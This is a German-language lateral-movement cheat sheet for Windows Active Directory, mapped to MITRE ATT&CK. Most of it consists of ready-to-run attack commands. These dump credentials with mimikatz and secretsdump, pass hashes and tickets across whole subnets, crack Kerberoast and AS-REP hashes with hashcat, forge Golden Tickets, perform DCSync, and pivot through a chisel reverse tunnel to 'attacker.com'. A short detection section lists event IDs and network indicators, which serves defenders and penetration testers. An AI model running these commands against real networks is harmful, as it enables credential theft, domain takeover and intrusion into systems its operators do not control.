# Lateral Movement

> Lateral Movement umfasst Techniken, mit denen Angreifer nach dem initialen Zugriff schrittweise in ein Netzwerk eindringen, weitere Systeme kompromittieren und Privilegien eskalieren.

## Inhalt

* [MITRE ATT&CK Mapping](#mitre-attck-mapping)
* [Pass-the-Hash (PtH)](#pass-the-hash-pth)
* [Pass-the-Ticket (PtT)](#pass-the-ticket-ptt)
* [Kerberos-Angriffe](#kerberos-angriffe)
* [Remote-Execution-Techniken](#remote-execution-techniken)
* [Netzwerk-Pivoting](#netzwerk-pivoting)
* [Active Directory Exploitation](#active-directory-exploitation)
* [Erkennungs-Indikatoren](#erkennungs-indikatoren)

---

## MITRE ATT&CK Mapping

| Technik | MITRE ID | Tools |
|---------|----------|-------|
| Pass the Hash | T1550.002 | netexec, impacket, mimikatz |
| Pass the Ticket | T1550.003 | Rubeus, impacket, mimikatz |
| Kerberoasting | T1558.003 | Rubeus, GetUserSPNs.py |
| AS-REP Roasting | T1558.004 | Rubeus, GetNPUsers.py |
| Golden Ticket | T1558.001 | mimikatz, Rubeus, ticketer.py |
| DCSync | T1003.006 | secretsdump.py, mimikatz |
| Remote Services: SMB | T1021.002 | psexec, smbexec, netexec |
| Remote Services: WMI | T1021.003 | wmiexec, netexec |
| Remote Services: RDP | T1021.001 | xfreerdp, netexec |
| Remote Services: WinRM | T1021.006 | evil-winrm, netexec |
| Exploitation of Remote Services | T1210 | metasploit |

---

## Pass-the-Hash (PtH)

### Funktionsweise
NTLM-Authentifizierung in Windows ermöglicht Authentifizierung mit dem NTLM-Hash des Passworts, ohne das Klartext-Passwort zu kennen. Funktioniert mit lokalen und Domain-Accounts.

### NTLM-Hash Beschaffung

```bash
# Via Mimikatz (auf kompromittiertem Windows-System)
# privilege::debug
# sekurlsa::logonpasswords
# -> NTLM: 8846f7eaee8fb117ad06bdd830b7586c

# Via Impacket secretsdump (remote)
python3 secretsdump.py domain/user:pass@192.168.1.100

# Via netexec
netexec smb 192.168.1.100 -u admin -p pass --sam
netexec smb 192.168.1.100 -u admin -p pass --lsa

# SAM-Hive dumpen (lokal)
reg save HKLM\SAM /tmp/sam.hive
reg save HKLM\SYSTEM /tmp/system.hive
python3 secretsdump.py -sam /tmp/sam.hive -system /tmp/system.hive LOCAL
```

### PtH-Angriffe

```bash
# SMB PsExec (interaktive Shell)
python3 psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/Admin@target

# WMI Exec (stealth, kein Service-Install)
python3 wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/Admin@target

# SMBExec (kein Disk-Write)
python3 smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c CORP/Admin@target

# netexec – Ganzes Subnetz
netexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --continue-on-success

# RDP PtH (Restricted Admin Mode)
xfreerdp /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /v:192.168.1.100 /cert:ignore

# Restricted Admin aktivieren (benötigt andere Admin-Rechte)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0
```

### PtH-Erkennungs-Indikatoren

- Event ID **4624** mit Logon Type **3** und erhöhten Privilegien
- Event ID **4648** (Logon mit expliziten Credentials)
- NTLMSSP-Authentifizierungs-Pakete ohne vorherige Kerberos-Versuche
- Anomales Authentifizierungs-Pattern von einem System zu vielen anderen

---

## Pass-the-Ticket (PtT)

### Funktionsweise
Kerberos-Tickets (TGT oder TGS) werden aus dem LSASS-Memory extrahiert und auf einem anderen System injiziert. Dadurch werden die Rechte des Ticket-Besitzers übernommen.

### Ticket-Extraktion

```bash
# Mimikatz – Alle Tickets exportieren
# sekurlsa::tickets /export
# -> *.kirbi-Dateien im aktuellen Verzeichnis

# Rubeus – Tickets aus Memory dumpen
Rubeus.exe dump /nowrap          # Alle Tickets (Base64)
Rubeus.exe dump /luid:0x3e4 /nowrap  # Spezifische Session

# Impacket – Kerberos-Cache lesen (Linux mit SSSD/Winbind)
python3 ticketer.py -request -domain corp.local -dc-ip 192.168.1.10 user:pass
```

### Ticket-Injektion

```bash
# Rubeus – Ticket injizieren
Rubeus.exe ptt /ticket:<base64_ticket>
Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz – Ticket injizieren
# kerberos::ptt ticket.kirbi
# kerberos::ptt C:\Tickets\

# Impacket – Ticket als ccache-Datei nutzen
export KRB5CCNAME=/tmp/admin.ccache
python3 psexec.py -k -no-pass CORP/admin@server.corp.local
python3 smbclient.py -k -no-pass CORP/admin@server.corp.local
```

---

## Kerberos-Angriffe

### AS-REP Roasting

**Bedingung**: Konten mit deaktivierter Kerberos-Pre-Authentifizierung
**Angriff**: TGT-Anfrage ohne Pre-Auth ergibt knackbaren AS-REP-Hash

```bash
# Impacket – ohne Credentials (AS-REP für alle Konten)
python3 GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 192.168.1.10

# Impacket – mit Credentials (vollständige Liste)
python3 GetNPUsers.py corp.local/user:pass -request -format hashcat -outputfile hashes.txt

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:targetuser /format:hashcat

# Hash cracken (Hashcat Mode 18200)
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

### Kerberoasting

**Bedingung**: Service-Accounts mit gesetztem SPN (Service Principal Name)
**Angriff**: TGS-Anfrage für beliebigen SPN ergibt knackbares Ticket

```bash
# Impacket
python3 GetUserSPNs.py corp.local/user:pass -dc-ip 192.168.1.10 -request -outputfile kerb.txt

# Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:kerb.txt
Rubeus.exe kerberoast /user:sqlsvc /format:hashcat  # Spezifischer Account

# Hash cracken (Hashcat Mode 13100)
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r rules/dive.rule
```

### Golden Ticket

**Bedingung**: KRBTGT-Hash (via DCSync) und Domain-SID
**Wirkung**: Forged TGT mit beliebigen Gruppen-Memberships, 10-Jahre gültig

```bash
# Schritt 1: KRBTGT-Hash via DCSync
python3 secretsdump.py -just-dc-user krbtgt corp.local/DomAdmin:pass@dc.corp.local
# -> krbtgt::CORP:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Schritt 2: Domain-SID ermitteln
python3 getPac.py -targetUser krbtgt corp.local/user:pass

# Schritt 3: Golden Ticket erstellen
python3 ticketer.py -nthash 8846f7eaee8fb117ad06bdd830b7586c \
  -domain-sid S-1-5-21-3623811015-3361044348-30300820 \
  -domain corp.local Administrator

# Schritt 4: Ticket nutzen
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass corp.local/Administrator@dc.corp.local

# Via Rubeus (auf Windows-System)
Rubeus.exe golden /rc4:8846f7eaee8fb117ad06bdd830b7586c \
  /domain:corp.local /sid:S-1-5-21-... /user:FakeAdmin /ptt
```

### DCSync

**Bedingung**: DS-Replication-Get-Changes-All Recht (üblicherweise Domain Admins)

```bash
# Alle Domain-Hashes
python3 secretsdump.py corp.local/DomAdmin:pass@dc.corp.local

# Nur NTDS (ohne LSA Secrets)
python3 secretsdump.py -just-dc corp.local/DomAdmin:pass@dc.corp.local

# Spezifischer Account
python3 secretsdump.py -just-dc-user Administrator corp.local/DomAdmin:pass@dc.corp.local

# Via Mimikatz
# lsadump::dcsync /user:CORP\Administrator
# lsadump::dcsync /all /csv
```

---

## Remote-Execution-Techniken

### SMB-basiert

| Tool | Technik | Disk-Write | Service-Install | Detection |
|------|---------|------------|-----------------|-----------|
| psexec.py | Service | Ja | Ja | Hoch |
| smbexec.py | Service | Nein | Ja | Mittel |
| atexec.py | Scheduled Task | Nein | Nein | Mittel |
| netexec --exec | Methode wählbar | Variabel | Variabel | Variabel |

### WMI-basiert

```bash
# wmiexec.py (keine Service-Installation, kein Disk-Write)
python3 wmiexec.py corp.local/admin:pass@target "cmd /c hostname"

# netexec WMI
netexec wmi 192.168.1.100 -u admin -p pass -x "ipconfig"
```

### WinRM (PowerShell Remoting)

```bash
# netexec WinRM
netexec winrm 192.168.1.100 -u admin -p pass -x "whoami /all"
netexec winrm 192.168.1.0/24 -u admin -p pass --continue-on-success

# Evil-WinRM
evil-winrm -i 192.168.1.100 -u Administrator -p Password123
evil-winrm -i 192.168.1.100 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c
```

---

## Netzwerk-Pivoting

### Pivot-Konzept

```
Angreifer-VM
    |
    | (SSH/HTTPS zu Pivot-Host)
    |
[Pivot-Host] -- Internes Netz 10.10.10.0/24
    |
[Internes Ziel] 10.10.10.100
```

### SSH Dynamic Proxy (SOCKS5)

```bash
# SOCKS5-Proxy via SSH
ssh -D 9050 user@pivot.host

# proxychains.conf
# socks5 127.0.0.1 9050

# Alle Tools durch Proxy
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://10.10.10.100/admin
proxychains python3 psexec.py admin:pass@10.10.10.100
```

### Chisel Reverse-Pivot

```bash
# Server (Angreifer) – akzeptiert eingehende Verbindungen
chisel server --port 8080 --reverse

# Client (kompromittiertes System)
chisel client attacker.com:8080 R:1080:socks

# Proxy nutzen via proxychains
# socks5 127.0.0.1 1080
proxychains netexec smb 10.10.10.0/24 -u admin -H <hash>
```

### sshuttle (Transparentes VPN)

```bash
# Kein proxychains erforderlich – transparentes Routing
sshuttle -r user@pivot.host 10.10.10.0/24 --dns

# Direkt scannen ohne Proxy-Konfiguration
nmap -sT 10.10.10.100
curl http://10.10.10.100:8080/
```

---

## Active Directory Exploitation

### BloodHound-Analyse

```bash
# Daten sammeln (Python Collector)
bloodhound-python -u user -p pass -d corp.local -c All --zip -dc dc.corp.local

# Wichtige BloodHound-Queries:
# - Shortest Path to Domain Admins
# - Kerberoastable Accounts
# - AS-REP Roastable Accounts
# - Computers where Domain Users are Local Admins
# - High Value Targets
```

### Constrained Delegation

```bash
# Accounts mit Constrained Delegation finden
python3 findDelegation.py corp.local/user:pass -dc-ip 192.168.1.10

# S4U2Proxy-Angriff (Rubeus)
Rubeus.exe s4u /user:svcaccount /rc4:<hash> /impersonateuser:Administrator \
  /msdsspn:cifs/fileserver.corp.local /ptt

# Impacket getST
python3 getST.py -spn cifs/fileserver.corp.local -impersonate Administrator \
  corp.local/svcaccount -hashes :hash -dc-ip 192.168.1.10
```

---

## Erkennungs-Indikatoren

### Windows Event IDs

| Event ID | Bedeutung | Lateral Movement Indikator |
|----------|-----------|---------------------------|
| 4624 | Erfolgreiche Anmeldung | Typ 3 (Netzwerk) von unbekanntem System |
| 4625 | Fehlgeschlagene Anmeldung | Spray-Pattern |
| 4648 | Anmeldung mit expliziten Credentials | PtH/PtT |
| 4768 | TGT angefordert | AS-REP Roasting |
| 4769 | TGS angefordert | Kerberoasting |
| 4771 | Kerberos Pre-Auth fehlgeschlagen | Brute Force |
| 7045 | Service installiert | PsExec |
| 4697 | Service installiert | PsExec |

### Netzwerk-Indikatoren

- **SMB-Verbindungen** auf vielen Hosts in kurzer Zeit
- **NTLM-Authentifizierung** statt Kerberos (PtH)
- **TGS-Anfragen** für viele verschiedene SPNs (Kerberoasting)
- **DCSync-Traffic**: DRSR-Protokoll von Non-DC-Systemen
- **Unusual WMI/DCOM-Verbindungen**

---

## Referenzen

- MITRE ATT&CK Lateral Movement: https://attack.mitre.org/tactics/TA0008/
- Impacket Examples: https://github.com/fortra/impacket/tree/master/examples
- Rubeus: https://github.com/GhostPack/Rubeus
- BloodHound: https://github.com/BloodHoundAD/BloodHound
- HarmJ0y's Blog: https://blog.harmj0y.net/
